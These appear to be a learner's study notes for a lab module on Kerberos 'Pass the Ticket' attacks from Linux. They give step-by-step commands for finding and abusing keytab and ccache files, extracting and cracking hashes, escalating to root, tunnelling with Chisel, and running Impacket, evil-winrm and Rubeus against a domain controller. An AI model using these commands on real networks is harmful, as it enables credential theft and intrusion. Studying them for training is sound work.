A Linux computer connected to Active Directory commonly uses Kerberos as authentication.

Suppose this is the case, and we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.

**Note: A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine**.

## Kerberos on Linux

Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS).

In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`.

This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed

These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are protected by specific read/write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

nother everyday use of Kerberos in Linux is with [keytab](https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro) files. A `keytab` is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password).

You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password.

`Keytab` files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file.

a script can use a keytab file to access files stored in the Windows share folder.

---

## Identifying Linux and Active Directory integration


We can identify if the Linux machine is domain-joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.

#### realm - Check if Linux machine is domain-joined

	david@inlanefreight.htb@linux01:~$ realm list

 `{david@inlanefreight.htb@linux01  WE GET THIS SHELL THROUGH SSH AUTHENTICATION}`

In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available

 [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html). USE THIS 

	david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

---

## Finding Kerberos tickets in Linux

As an attacker, we are always looking for credentials. we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings.

## Finding KeyTab files

A straightforward approach is to use `find` to search for files whose name contains the word `keytab`. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to `.keytab`.

#### Using Find to search for files with keytab in the name

	david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

**Note:** To use a keytab file, we must have read and write (rw) privileges on the file.

Another way to find `KeyTab` files is in automated scripts configured using a cronjob or any other Linux service.

If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the `.keytab` extension, we may find the appropriate filename within the script. Let's see this example:

#### Identifying KeyTab files in Cronjobs

	carlos@inlanefreight.htb@linux01:~$ crontab -l

we notice the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html), which means that Kerberos is in use. [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file).

We can use `kinit` to import a `keytab` into our session and act as the user.

**Note:** As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

## Finding ccache files

A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file holds Kerberos credentials while they remain valid and,

Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the `KRB5CCNAME` environment variable.

This variable is used by tools that support Kerberos authentication to find the Kerberos data.

#### Reviewing environment variables for ccache files.

	david@inlanefreight.htb@linux01:~$ env | grep -i krb5 
	
	KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh

As mentioned previously, `ccache` files are located, by default, at `/tmp`. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user

#### Searching for ccache files in /tmp

	david@inlanefreight.htb@linux01:~$ ls -la /tmp


---
## Abusing KeyTab files

we may have several uses for a keytab file. The first thing we can do is impersonate a user using `kinit`

To use a keytab file, we need to know which user it was created for. `klist` is another application used to interact with Kerberos on Linux. This application reads information from a `keytab` file. Let's see that with the following command:

#### Listing KeyTab file information

	david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab

The ticket corresponds to the user Carlos. We can now impersonate the user with `kinit`. Let's confirm which ticket we are using with `klist` and then import Carlos's ticket into our session with `kinit`.

**Note:** **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.

#### Impersonating a user with a KeyTab

	david@inlanefreight.htb@linux01:~$ klist

	david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t

	david@inlanefreight.htb@linux01:~$ klist

We can attempt to access the shared folder `\\dc01\carlos` to confirm our access.

#### Connecting to SMB Share as Carlos

	david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.

### KeyTab Extract

The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file.

We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.

We can attempt to crack the account's password by extracting the hashes from the keytab file.

use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type `.keytab` files,

#### Extracting KeyTab hashes with KeyTabExtract

	david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

**Note: A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.**

The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it. However, a quick way to decrypt passwords is with online repositories such as [https://crackstation.net/](https://crackstation.net/), which contains billions of passwords.

now we have the password of carlos - `Password5`

#### Log in as Carlos

	david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
	Password: 
	
	carlos@inlanefreight.htb@linux01:~$ klist

### Obtaining more hashes

Carlos has a cronjob that uses a KeyTab file named `svc_workstations.kt`. We can repeat the process, crack the password, and log in as `svc_workstations`.

## Abusing KeyTab ccache

To abuse a ccache file, all we need is read privileges on the file. These files, located in `/tmp`, can only be read by the user who created them, but if we gain root access, we could use them.

Once we log in with the credentials for the user `svc_workstations`, we can use `sudo -l` and confirm that the user can execute any command as root. We can use the `sudo su` command to change the user to root.

#### Privilege escalation to root

	AstraX01@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222

	svc_workstations@inlanefreight.htb@10.129.204.23's password:

	svc_workstations@inlanefreight.htb@linux01:~$ sudo -l

	svc_workstations@inlanefreight.htb@linux01:~$ sudo su 
	
	root@linux01:/home/svc_workstations@inlanefreight.htb# whoami

As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.

#### Looking for ccache files

	root@linux01:~# ls -la /tmp

#### Identifying group membership with the id command

	root@linux01:~# id julio@inlanefreight.htb

To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.

#### Importing the ccache file into our current session

	root@linux01:~# klist

	root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 . 
	root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133 
	root@linux01:~# klist

	root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass

**Note: klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.**

---

## Using Linux attack tools with Kerberos

 If we use them from a domain-joined machine, we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use.

n case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.

 To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

#### Host file modified

	AstraX01@htb[/htb]$ cat /etc/hosts

We need to modify our proxychains configuration file to use socks5 and port 1080.

#### Proxychains configuration file

	AstraX01@htb[/htb]$ cat /etc/proxychains.conf

We must download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.

#### Download Chisel to our attack host

	AstraX01@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz 
	AstraX01@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz 
	AstraX01@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel 
	AstraX01@htb[/htb]$ sudo ./chisel server --reverse

Connect to `MS01` via RDP and execute chisel (located in C:\Tools).

#### Connect to MS01 with xfreerdp

	AstraX01@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution

#### Execute chisel from MS01

	C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

**Note: The client IP is your attack host IP.**

Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.

#### Setting the KRB5CCNAME environment variable

	AstraX01@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133

---
### Impacket

To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option `-k`. If we get a prompt for a password, we can also include the option `-no-pass`.

#### Using Impacket with proxychains and Kerberos authentication

	AstraX01@htb[/htb]$ proxychains impacket-wmiexec dc01 -k

	C:\>whoami

**Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.**

### Evil-WinRM

To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`.

#### Installing Kerberos authentication package

	AstraX01@htb[/htb]$ sudo apt-get install krb5-user -y

The Kerberos servers can be empty.

#### Administrative server for your Kerberos realm

In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:

#### Kerberos configuration file for INLANEFREIGHT.HTB

	AstraX01@htb[/htb]$ cat /etc/krb5.conf

#### **Using Evil-WinRM with Kerberos**

	AstraX01@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.

#### Impacket Ticket converter

We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.

#### Importing converted ticket into Windows session with Rubeus

	C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

	C:\htb>dir \\dc01\julio

	


